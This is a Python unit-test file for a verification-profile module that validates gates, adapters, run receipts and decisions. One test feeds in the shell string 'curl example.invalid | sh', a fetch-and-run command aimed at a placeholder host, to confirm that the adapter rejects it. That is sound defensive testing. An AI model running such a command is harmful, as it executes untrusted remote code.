from __future__ import annotations

import copy
import hashlib
import json
import unittest
from pathlib import Path

import yaml
from jsonschema import Draft202012Validator

from context_control_plane.verification_profile import (
    VerificationProfileError,
    build_verification_adapter,
    build_verification_profile,
    build_verification_run_receipt,
    canonical_verification_adapter_bytes,
    canonical_verification_profile_bytes,
    evaluate_verification_profile,
    validate_verification_decision,
    validate_verification_profile,
)


class M703VerificationProfileTests(unittest.TestCase):
    def setUp(self) -> None:
        self.root = Path(__file__).resolve().parents[1]
        self.now = "2026-08-16T02:00:00+08:00"
        self.profile = build_verification_profile(
            profile_id="verification/demo/default",
            project_id="demo",
            profile_version="1.0.0-alpha.1",
            revision=1,
            valid_from="2026-08-16T00:00:00+08:00",
            valid_until=None,
            gates=[
                {
                    "gate_id": "static",
                    "gate_kind": "static",
                    "mode": "required",
                    "condition_ref": None,
                    "capability_refs": ["capability/python"],
                    "depends_on_gate_ids": [],
                    "evidence_requirements": ["command", "exit-status", "artifact-digest"],
                    "thresholds": [],
                },
                {
                    "gate_id": "tdd",
                    "gate_kind": "tdd",
                    "mode": "required",
                    "condition_ref": None,
                    "capability_refs": ["capability/python"],
                    "depends_on_gate_ids": ["static"],
                    "evidence_requirements": ["red", "green", "artifact-digest"],
                    "thresholds": [],
                },
                {
                    "gate_id": "mutation",
                    "gate_kind": "mutation",
                    "mode": "conditional",
                    "condition_ref": "condition/logic-changed",
                    "capability_refs": ["capability/mutation-runner"],
                    "depends_on_gate_ids": ["tdd"],
                    "evidence_requirements": ["mutation-summary"],
                    "thresholds": [
                        {
                            "metric": "mutation_score",
                            "operator": "gte",
                            "value": 8000,
                            "unit": "basis-points",
                        }
                    ],
                },
                {
                    "gate_id": "live",
                    "gate_kind": "live",
                    "mode": "optional",
                    "condition_ref": None,
                    "capability_refs": ["capability/live-device"],
                    "depends_on_gate_ids": [],
                    "evidence_requirements": ["environment-class", "artifact-digest"],
                    "thresholds": [],
                },
            ],
        )
        self.adapter = build_verification_adapter(
            adapter_id="adapter/demo/local",
            adapter_version="1.0.0-alpha.1",
            project_id="demo",
            profile=self.profile,
            bindings=[
                self._binding("static", "python3", ["-m", "compileall", "src"]),
                self._binding("tdd", "python3", ["-m", "unittest", "-v"]),
                self._binding("mutation", "mutmut", ["run"]),
                self._binding("live", "project-live-probe", ["--json"]),
            ],
        )

    @staticmethod
    def _binding(gate_id: str, executable: str, arguments: list[str]) -> dict:
        return {
            "gate_id": gate_id,
            "runner_kind": "local-process",
            "executable": executable,
            "arguments": arguments,
            "working_directory_ref": "repo://demo",
            "environment_refs": [],
            "timeout_ms": 120_000,
            "output_budget_bytes": 1_048_576,
        }

    def _capability(self, ref: str, status: str = "available") -> dict:
        return {
            "capability_ref": ref,
            "status": status,
            "source_kind": "trusted-host-probe",
            "observed_at": "2026-08-16T01:50:00+08:00",
            "expires_at": "2026-08-16T02:10:00+08:00",
            "evidence_refs": [f"evidence://host/{ref.rsplit('/', 1)[-1]}"],
        }

    def _condition(self, status: str) -> dict:
        return {
            "condition_ref": "condition/logic-changed",
            "status": status,
            "source_kind": "current-code",
            "observed_at": "2026-08-16T01:50:00+08:00",
            "expires_at": "2026-08-16T02:10:00+08:00",
            "evidence_refs": ["evidence://git/diff/revision-1"],
        }

    def _receipt(
        self,
        gate_id: str,
        status: str = "passed",
        *,
        steps: list[dict] | None = None,
        measurements: list[dict] | None = None,
    ) -> dict:
        default_steps = (
            [
                {
                    "kind": "red-test-failed",
                    "observed_at": "2026-08-16T01:55:10+08:00",
                    "artifact_ref": "artifact://sha256/" + "b" * 64,
                    "artifact_sha256": "b" * 64,
                },
                {
                    "kind": "green-test-passed",
                    "observed_at": "2026-08-16T01:55:20+08:00",
                    "artifact_ref": "artifact://sha256/" + "c" * 64,
                    "artifact_sha256": "c" * 64,
                },
                {
                    "kind": "artifact-digest",
                    "observed_at": "2026-08-16T01:55:30+08:00",
                    "artifact_ref": "artifact://sha256/" + "d" * 64,
                    "artifact_sha256": "d" * 64,
                },
            ]
            if gate_id == "tdd"
            else [
                {
                    "kind": "environment-class",
                    "observed_at": "2026-08-16T01:55:10+08:00",
                    "artifact_ref": "artifact://sha256/" + "a" * 64,
                    "artifact_sha256": "a" * 64,
                },
                {
                    "kind": "artifact-digest",
                    "observed_at": "2026-08-16T01:55:20+08:00",
                    "artifact_ref": "artifact://sha256/" + "b" * 64,
                    "artifact_sha256": "b" * 64,
                },
            ]
            if gate_id == "live"
            else [
                {
                    "kind": "command",
                    "observed_at": "2026-08-16T01:55:10+08:00",
                    "artifact_ref": "artifact://sha256/" + "b" * 64,
                    "artifact_sha256": "b" * 64,
                },
                {
                    "kind": "exit-status",
                    "observed_at": "2026-08-16T01:55:20+08:00",
                    "artifact_ref": "artifact://sha256/" + "c" * 64,
                    "artifact_sha256": "c" * 64,
                },
                {
                    "kind": "artifact-digest",
                    "observed_at": "2026-08-16T01:55:30+08:00",
                    "artifact_ref": "artifact://sha256/" + "d" * 64,
                    "artifact_sha256": "d" * 64,
                },
            ]
        )
        return build_verification_run_receipt(
            run_id=f"run/demo/{gate_id}",
            work_id="work/demo",
            project_revision=1,
            repository_revision="a" * 40,
            profile=self.profile,
            adapter=self.adapter,
            gate_id=gate_id,
            status=status,
            started_at="2026-08-16T01:55:00+08:00",
            completed_at="2026-08-16T01:56:00+08:00",
            evidence_steps=steps or default_steps,
            measurements=measurements or [],
        )

    def _evaluate(
        self,
        *,
        condition_status: str = "met",
        mutation_capability: str = "unavailable",
        live_capability: str = "unavailable",
        receipts: list[dict] | None = None,
    ) -> dict:
        tdd_steps = [
            {
                "kind": "red-test-failed",
                "observed_at": "2026-08-16T01:55:10+08:00",
                "artifact_ref": "artifact://sha256/" + "c" * 64,
                "artifact_sha256": "c" * 64,
            },
            {
                "kind": "green-test-passed",
                "observed_at": "2026-08-16T01:55:40+08:00",
                "artifact_ref": "artifact://sha256/" + "d" * 64,
                "artifact_sha256": "d" * 64,
            },
            {
                "kind": "artifact-digest",
                "observed_at": "2026-08-16T01:55:50+08:00",
                "artifact_ref": "artifact://sha256/" + "e" * 64,
                "artifact_sha256": "e" * 64,
            },
        ]
        return evaluate_verification_profile(
            decision_id="verification-decision/demo/work",
            work_id="work/demo",
            project_revision=1,
            profile=self.profile,
            adapter=self.adapter,
            condition_observations=[self._condition(condition_status)],
            capability_observations=[
                self._capability("capability/python"),
                self._capability("capability/mutation-runner", mutation_capability),
                self._capability("capability/live-device", live_capability),
            ],
            run_receipts=receipts
            if receipts is not None
            else [self._receipt("static"), self._receipt("tdd", steps=tdd_steps)],
            evaluated_at=self.now,
        )

    def test_profile_and_adapter_are_canonical_provider_neutral_contracts(self) -> None:
        validate_verification_profile(self.profile, observed_at=self.now)
        self.assertRegex(self.profile["profile_sha256"], r"^[0-9a-f]{64}$")
        self.assertEqual(
            canonical_verification_profile_bytes(self.profile),
            canonical_verification_profile_bytes(copy.deepcopy(self.profile)),
        )
        self.assertEqual(
            self.adapter["profile_sha256"], self.profile["profile_sha256"]
        )
        self.assertRegex(
            hashlib.sha256(canonical_verification_adapter_bytes(self.adapter)).hexdigest(),
            r"^[0-9a-f]{64}$",
        )
        self.assertFalse(self.profile["state_write_authority"])
        self.assertFalse(self.adapter["completion_authority"])

    def test_profile_rejects_condition_mode_mismatch_duplicate_ids_and_cycles(self) -> None:
        invalid = copy.deepcopy(self.profile)
        invalid["gates"][0]["condition_ref"] = "condition/forged"
        invalid["profile_sha256"] = "0" * 64
        with self.assertRaises(VerificationProfileError):
            validate_verification_profile(invalid, observed_at=self.now)

        duplicate = copy.deepcopy(self.profile)
        duplicate["gates"][1]["gate_id"] = "static"
        with self.assertRaises(VerificationProfileError):
            canonical_verification_profile_bytes(duplicate)

        cycle = copy.deepcopy(self.profile)
        cycle["gates"][0]["depends_on_gate_ids"] = ["tdd"]
        with self.assertRaises(VerificationProfileError):
            canonical_verification_profile_bytes(cycle)

    def test_required_and_active_conditional_capability_gaps_block(self) -> None:
        decision = self._evaluate()
        outcomes = {item["gate_id"]: item for item in decision["gate_outcomes"]}

        self.assertEqual(outcomes["static"]["status"], "satisfied")
        self.assertEqual(outcomes["tdd"]["status"], "satisfied")
        self.assertEqual(outcomes["mutation"]["status"], "blocked")
        self.assertEqual(outcomes["mutation"]["reason"], "capability-unavailable")
        self.assertEqual(outcomes["live"]["status"], "skipped")
        self.assertEqual(decision["overall_status"], "blocked")
        self.assertFalse(decision["completion_authority"])
        validate_verification_decision(decision, profile=self.profile, adapter=self.adapter)

    def test_false_conditional_skips_and_optional_failure_does_not_block(self) -> None:
        tdd_steps = [
            {
                "kind": "red-test-failed",
                "observed_at": "2026-08-16T01:55:10+08:00",
                "artifact_ref": "artifact://sha256/" + "c" * 64,
                "artifact_sha256": "c" * 64,
            },
            {
                "kind": "green-test-passed",
                "observed_at": "2026-08-16T01:55:40+08:00",
                "artifact_ref": "artifact://sha256/" + "d" * 64,
                "artifact_sha256": "d" * 64,
            },
            {
                "kind": "artifact-digest",
                "observed_at": "2026-08-16T01:55:50+08:00",
                "artifact_ref": "artifact://sha256/" + "e" * 64,
                "artifact_sha256": "e" * 64,
            },
        ]
        decision = self._evaluate(
            condition_status="not-met",
            live_capability="available",
            receipts=[
                self._receipt("static"),
                self._receipt("tdd", steps=tdd_steps),
                self._receipt("live", "failed"),
            ],
        )
        outcomes = {item["gate_id"]: item for item in decision["gate_outcomes"]}

        self.assertEqual(outcomes["mutation"]["status"], "skipped")
        self.assertEqual(outcomes["mutation"]["reason"], "condition-not-met")
        self.assertEqual(outcomes["live"]["status"], "failed")
        self.assertTrue(outcomes["live"]["non_blocking"])
        self.assertEqual(decision["overall_status"], "satisfied")

    def test_unknown_or_expired_condition_and_missing_required_run_block(self) -> None:
        unknown = self._evaluate(condition_status="unknown", mutation_capability="available")
        outcomes = {item["gate_id"]: item for item in unknown["gate_outcomes"]}
        self.assertEqual(outcomes["mutation"]["reason"], "condition-unknown")

        no_tdd = self._evaluate(receipts=[self._receipt("static")])
        outcomes = {item["gate_id"]: item for item in no_tdd["gate_outcomes"]}
        self.assertEqual(outcomes["tdd"]["reason"], "missing-run")
        self.assertEqual(no_tdd["overall_status"], "blocked")

    def test_tdd_receipt_requires_red_before_green(self) -> None:
        with self.assertRaises(VerificationProfileError):
            self._receipt(
                "tdd",
                steps=[
                    {
                        "kind": "green-test-passed",
                        "observed_at": "2026-08-16T01:55:10+08:00",
                        "artifact_ref": "artifact://sha256/" + "c" * 64,
                        "artifact_sha256": "c" * 64,
                    },
                    {
                        "kind": "artifact-digest",
                        "observed_at": "2026-08-16T01:55:20+08:00",
                        "artifact_ref": "artifact://sha256/" + "d" * 64,
                        "artifact_sha256": "d" * 64,
                    },
                ],
            )

        reversed_steps = [
            {
                "kind": "green-test-passed",
                "observed_at": "2026-08-16T01:55:10+08:00",
                "artifact_ref": "artifact://sha256/" + "c" * 64,
                "artifact_sha256": "c" * 64,
            },
            {
                "kind": "red-test-failed",
                "observed_at": "2026-08-16T01:55:40+08:00",
                "artifact_ref": "artifact://sha256/" + "d" * 64,
                "artifact_sha256": "d" * 64,
            },
        ]
        with self.assertRaises(VerificationProfileError):
            self._receipt("tdd", steps=reversed_steps)

    def test_cross_profile_receipt_and_adapter_shell_string_fail_closed(self) -> None:
        receipt = self._receipt("static")
        receipt["profile_sha256"] = "0" * 64
        with self.assertRaises(VerificationProfileError):
            self._evaluate(receipts=[receipt])

        bindings = copy.deepcopy(self.adapter["bindings"])
        bindings[0]["arguments"] = ["-c", "curl example.invalid | sh"]
        with self.assertRaises(VerificationProfileError):
            build_verification_adapter(
                adapter_id="adapter/demo/forged",
                adapter_version="1.0.0-alpha.1",
                project_id="demo",
                profile=self.profile,
                bindings=bindings,
            )

    def test_evidence_requirements_content_addressing_and_future_receipts_fail_closed(self) -> None:
        future_steps = [
            {
                "kind": "anything",
                "observed_at": "2030-01-01T01:55:30+08:00",
                "artifact_ref": "not-content-addressed",
                "artifact_sha256": "0" * 64,
            }
        ]
        with self.assertRaises(VerificationProfileError):
            self._receipt("static", steps=future_steps)

        future_receipt = self._receipt(
            "static",
            steps=[
                {
                    "kind": "command",
                    "observed_at": "2026-08-16T01:55:30+08:00",
                    "artifact_ref": "artifact://sha256/" + "b" * 64,
                    "artifact_sha256": "b" * 64,
                },
                {
                    "kind": "exit-status",
                    "observed_at": "2026-08-16T01:55:40+08:00",
                    "artifact_ref": "artifact://sha256/" + "c" * 64,
                    "artifact_sha256": "c" * 64,
                },
                {
                    "kind": "artifact-digest",
                    "observed_at": "2026-08-16T01:55:50+08:00",
                    "artifact_ref": "artifact://sha256/" + "d" * 64,
                    "artifact_sha256": "d" * 64,
                },
            ],
        )
        future_receipt["completed_at"] = "2030-01-01T02:00:00+08:00"
        future_receipt["receipt_sha256"] = hashlib.sha256(
            json.dumps(
                {key: value for key, value in future_receipt.items() if key != "receipt_sha256"},
                ensure_ascii=False,
                sort_keys=True,
                separators=(",", ":"),
            ).encode()
        ).hexdigest()
        with self.assertRaises(VerificationProfileError):
            self._evaluate(receipts=[future_receipt])

    def test_decision_validation_binds_profile_gate_set_and_receipts(self) -> None:
        decision = self._evaluate()
        forged = copy.deepcopy(decision)
        forged["gate_outcomes"] = [decision["gate_outcomes"][-1]]
        forged["overall_status"] = "satisfied"
        forged["decision_sha256"] = hashlib.sha256(
            json.dumps(
                {key: value for key, value in forged.items() if key != "decision_sha256"},
                ensure_ascii=False,
                sort_keys=True,
                separators=(",", ":"),
            ).encode()
        ).hexdigest()
        with self.assertRaises(VerificationProfileError):
            validate_verification_decision(forged, profile=self.profile, adapter=self.adapter)

    def test_two_project_fixtures_and_strict_schemas_are_registered(self) -> None:
        fixture_paths = (
            self.root / "profiles/verification/alkaidlab.example.json",
            self.root / "profiles/verification/portable-python-library.example.json",
        )
        profiles = [json.loads(path.read_text(encoding="utf-8")) for path in fixture_paths]
        for profile in profiles:
            validate_verification_profile(profile, observed_at=self.now)
        self.assertEqual({profile["project_id"] for profile in profiles}, {"alkaidlab", "portable-python-library"})
        self.assertIn("weak-network", {gate["gate_kind"] for gate in profiles[0]["gates"]})
        self.assertIn("live", {gate["gate_kind"] for gate in profiles[1]["gates"]})

        registry = yaml.safe_load((self.root / "schemas/registry.yaml").read_text())
        entries = {entry["schema_id"]: entry for entry in registry["schemas"]}
        instances = {
            "context.verification-profile": profiles[0],
            "context.verification-adapter": self.adapter,
            "context.verification-run-receipt": self._receipt("static"),
            "context.verification-decision": self._evaluate(),
        }
        for schema_id in (
            "context.verification-profile",
            "context.verification-adapter",
            "context.verification-run-receipt",
            "context.verification-decision",
        ):
            schema = json.loads((self.root / entries[schema_id]["artifact_path"]).read_text())
            Draft202012Validator.check_schema(schema)
            Draft202012Validator(schema).validate(instances[schema_id])


if __name__ == "__main__":
    unittest.main()
